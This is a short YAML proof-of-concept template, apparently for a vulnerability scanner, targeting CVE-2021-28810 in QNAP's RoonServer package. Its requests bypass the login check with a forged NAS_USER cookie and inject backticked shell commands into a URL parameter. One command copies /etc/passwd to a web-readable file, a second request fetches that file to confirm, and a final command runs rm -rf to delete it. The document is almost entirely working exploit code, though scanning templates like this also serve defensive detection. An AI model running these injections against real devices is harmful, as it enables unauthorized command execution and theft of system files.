name: poc-yaml-qnap-cve-2021-28810
set:
  rand: randomInt(1000, 9999)
  r1: randomLowercase(4)
rules:
  - method: GET
    path: /cgi-bin/qpkg/RoonServer/ajax/ajax.php?a=updateformfield&t=`cat%20/etc/passwd%20>{{r1}}`
    headers:
      cookie: NAS_USER={{rand}}
    expression: |
      response.status == 200 && !response.body.bcontains(b"not logged in")
  - method: GET
    path: /cgi-bin/qpkg/RoonServer/ajax/{{r1}}
    expression: |
      response.status == 200 && response.body.bcontains(b"admin:x:0:0")
  - method: POST
    path: /cgi-bin/qpkg/RoonServer/ajax/ajax.php?a=updateformfield&t=`rm%20-rf%20{{r1}}`
    headers:
      cookie: NAS_USER={{rand}}
    expression: |
      response.status == 200 && !response.body.bcontains(b"not logged in")
detail:
  author: albertchang
  links:
    - https://mp.weixin.qq.com/s/xfT3LkYNlzFYJdG1z0c7ug
